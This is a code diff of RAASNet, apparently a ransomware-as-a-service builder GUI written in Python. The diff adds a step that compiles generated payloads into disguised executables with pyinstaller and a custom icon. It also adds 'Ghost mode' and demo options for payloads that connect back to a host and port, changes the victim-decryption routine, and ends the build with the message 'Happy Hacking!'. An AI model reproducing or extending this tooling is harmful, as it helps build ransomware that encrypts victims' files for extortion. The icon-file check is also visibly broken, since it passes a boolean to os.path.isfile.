@@ -1,9 +1,20 @@
 #!/usr/bin/env python3
+'''
+Welcome to RAASNet v0.1
+
+To use all features of this software, please do:
+pip3 install -r requirements.txt
+
+Compile this software with:
+pyinstaller -F -w -i images/icon.ico --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes --hidden-import pymsgbox RAASNet.py
+
+'''
 import os, sys, subprocess, threading, time, datetime, socket, select, PIL.Image, PIL.ImageTk, webbrowser, base64, platform
 from tkinter import *
 from tkinter.ttk import *
 from ttkthemes import ThemedStyle
 from tkinter import messagebox
+from tkinter.filedialog import askopenfilename
 from pymsgbox import *
 from io import BytesIO
 
@@ -27,17 +38,17 @@ def dec_key():
     key = password(text='Please enter your decryption key', title='Enter Key', mask ='*')
     if key == None or key == '':
         messagebox.showwarning('Error', 'Please, enter your key.')
-        return dec_key()
-    elif not len(key) == 32:
+        return False
+    if not len(key) == 32:
         messagebox.showwarning('Invalid Key', 'Key should be 32 characters long')
-        return dec_key()
+        return False
     return key
 
 def dec_path():
     path = askdirectory(title = 'Select directory with files to decrypt')
     if path == None or path == '':
         messagebox.showwarning('Error', 'No path selected, exiting...')
-        sys.exit(1)
+        return False
     path =  path + '/'
     return path
 
@@ -91,8 +102,12 @@ class MainWindow(Tk):
             'platform' : StringVar(),
             'key' : StringVar(),
             'os' : StringVar(),
-            'full_screen_var' : StringVar(),
+            'full_screen_var' : IntVar(),
             'mode' : IntVar(),
+            'demo' : IntVar(),
+            'ghost' : IntVar(),
+            'icon_path' : StringVar(),
+            'payload_path' : StringVar(),
         }
 
         # Default Settings
@@ -100,6 +115,8 @@ class MainWindow(Tk):
         self.options['port'].set(8989)
         self.options['full_screen_var'].set(1)
         self.options['mode'].set(1)
+        self.options['demo'].set(0)
+        self.options['ghost'].set(0)
 
         self.bind("<Escape>", self.exit_event) # Press ESC to quit app
 
@@ -211,33 +228,88 @@ class MainWindow(Tk):
 
         self.comp.bind("<Escape>", self.close_compile) # Press ESC to close window
 
-        ico_path = None
-        payload_path = None
+        if os.path.isfile('./payload.py'):
+            self.options['payload_path'].set('./payload.py')
 
         msg = LabelFrame(self.comp, text = 'Message', relief = GROOVE)
-        msg.grid(row = 0, column = 0, columnspan = 3)
-        Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on' % platform.system(), background = 'white', font='Helvetica 16').grid(row = 0, column = 0)
+        msg.grid(row = 0, column = 0, columnspan = 3, sticky = 'w')
+        Label(msg, text = 'You seem to be running %s.\nYou can only compile for the OS you are running this software on.' % platform.system(), background = 'white', font='Helvetica 16').grid(row = 0, column = 0)
 
         os_frame = LabelFrame(self.comp, text = 'Select OS')
         os_frame.grid(row = 1, column = 0)
-        windows = Radiobutton(os_frame, text = 'Windows', variable = self.options['os'], value = 'windows').grid(row = 0, column = 0, sticky = 'w')
-        mac = Radiobutton(os_frame, text = 'MacOS', variable = self.options['os'], value = 'mac').grid(row = 1, column = 0, sticky = 'w')
-        linux = Radiobutton(os_frame, text = 'Linux', variable = self.options['os'], value = 'linux').grid(row = 2, column = 0, sticky = 'w')
+        win = Radiobutton(os_frame, text = 'Windows', variable = self.options['os'], value = 'windows')
+        win.grid(row = 0, column = 0, sticky = 'w')
+        mac = Radiobutton(os_frame, text = 'MacOS', variable = self.options['os'], value = 'mac')
+        mac.grid(row = 1, column = 0, sticky = 'w')
+        lin = Radiobutton(os_frame, text = 'Linux', variable = self.options['os'], value = 'linux')
+        lin.grid(row = 2, column = 0, sticky = 'w')
 
         sett_frame = LabelFrame(self.comp, text = 'Options')
         sett_frame.grid(row = 1, column = 1, columnspan = 2)
-        ico_path = Entry(sett_frame, textvariable = ico_path, width = 20)
-        ico_path.grid(row = 0, column = 0)
-        set_ico = Button(sett_frame, text = "SELECT ICON", command = self.comp.destroy, width = 15).grid(row = 0, column = 1)
+        Entry(sett_frame, textvariable = self.options['icon_path'], width = 50).grid(row = 0, column = 0)
+        set_ico = Button(sett_frame, text = "SELECT ICON", command = self.select_icon, width = 15).grid(row = 0, column = 1)
 
-        payload_path = Entry(sett_frame, textvariable = payload_path, width = 20)
-        payload_path.grid(row = 1, column = 0)
-        set_payload = Button(sett_frame, text = "SELECT PAYLOAD", command = self.comp.destroy, width = 15).grid(row = 1, column = 1)
+        Entry(sett_frame, textvariable = self.options['payload_path'], width = 50).grid(row = 1, column = 0)
+        set_payload = Button(sett_frame, text = "SELECT PAYLOAD", command = self.select_payload, width = 15).grid(row = 1, column = 1)
 
         opt_frame = LabelFrame(self.comp, text = 'Finishing')
         opt_frame.grid(row = 2, column = 0, columnspan = 2)
-        finish = Button(opt_frame, text = "FINISH", command = self.comp.destroy, width = 45).grid(row = 0, column = 0)
+        finish = Button(opt_frame, text = "FINISH", command = self.compile_payload, width = 45).grid(row = 0, column = 0)
 
+        if platform.system() == 'Windows':
+            self.options['os'].set('windows')
+            mac.config(state = DISABLED)
+            lin.config(state = DISABLED)
+        elif platform.system() == 'Darwin':
+            self.options['os'].set('mac')
+            win.config(state = DISABLED)
+            lin.config(state = DISABLED)
+        elif platform.system() == 'Linux':
+            self.options['os'].set('linux')
+            win.config(state = DISABLED)
+            mac.config(state = DISABLED)
+
+    def compile_payload(self):
+        icon = False
+
+        if not self.options['icon_path'].get() == '':
+            if not os.path.isfile(self.options['icon_path'].get() == ''):
+                return messagebox.showwarning('ERROR', 'Icon File Not Found!')
+            else:
+                icon = True
+        if not os.path.isfile(self.options['payload_path'].get()):
+            return messagebox.showwarning('ERROR', 'Payload Not Found!')
+
+        q = messagebox.askokcancel('Notice','Current version only supports compiling without pycrypto, which means it only works if you generated the payload with demo enabled\n\nClick OK to continue, cancel to cancel.')
+        if q == True:
+            pass
+        else:
+            return
+
+        try:
+            if self.options['os'].get() == 'windows':
+                py = 'pyinstaller.exe'
+            else:
+                py = 'pyinstaller'
+
+            if icon == True:
+                #os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes --hidden-import pycrypto %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
+                os.system("%s -F -w -i %s --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes %s" % (py, self.options['icon_path'].get(), self.options['payload_path'].get()))
+            else:
+                #os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes --hidden-import pycrypto %s" % (py, self.options['payload_path'].get()))
+                os.system("%s -F -w --hidden-import tkinter --hidden-import tkinter.ttk --hidden-import ttkthemes %s" % (py, self.options['payload_path'].get()))
+
+            messagebox.showinfo('SUCCESS', 'Compiled successfully!\nFile located in: dist/\n\nHappy Hacking!')
+            self.comp.destroy()
+
+        except Exception as e:
+            messagebox.showwarning('ERROR', 'Failed to compile!\n\n%s' % e)
+
+    def select_icon(self):
+        self.options['icon_path'].set(askopenfilename(initialdir = "./", title = 'Select Icon...', filetypes = (('Icon Files', '*.ico'), ('All Files', '*.*'))))
+
+    def select_payload(self):
+        self.options['payload_path'].set(askopenfilename(initialdir = "./", title = 'Select Payload...', filetypes = (('Python Files', '*.py'), ('All Files', '*.*'))))
 
     def generate(self):
         self.gen = Toplevel()
@@ -257,23 +329,28 @@ class MainWindow(Tk):
         server_frame.grid(row = 0, column = 1)
         Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['host'], width = 20).grid(row = 0, column = 1)
-
         Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
+        options_frame = LabelFrame(self.gen, text = 'Options')
+        options_frame.grid(row = 1, column = 0)
+        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0)
+        Checkbutton(options_frame, text = 'Ghost mode', variable = self.options['ghost'], onvalue = 1, offvalue = 0).grid(row = 0, column = 1)
+
         finish_frame = LabelFrame(self.gen, text = 'Finish')
-        finish_frame.grid(row = 1, column = 0, columnspan = 2)
+        finish_frame.grid(row = 1, column = 1, columnspan = 1)
         generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 20).grid(row = 0, column = 0)
 
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
-            messagebox.showwarning('Disabled', 'Fullscreen mode is for GUI mode only, fullscreen mode automaticly disabled!')
+            self.options['demo'].set(0)
+            messagebox.showwarning('Disabled', 'Fullscreen and Demo mode are available for GUI mode only, these options have been automaticly disabled!')
 
 
     def make_demon(self):
         try:
-            create_demon(self.options['host'].get(), self.options['port'].get(), self.options['full_screen_var'].get())
+            create_demon(self.options['host'].get(), self.options['port'].get(), self.options['full_screen_var'].get(), self.options['demo'].get(), self.options['ghost'].get())
             messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
             self.gen.destroy()
         except Exception as e:
@@ -281,7 +358,13 @@ class MainWindow(Tk):
 
     def decrypt_files(self):
         key = dec_key()
+        if key == False:
+            return
+
         p = dec_path()
+        if p == False:
+            return
+
 
         try:
             counter = 0
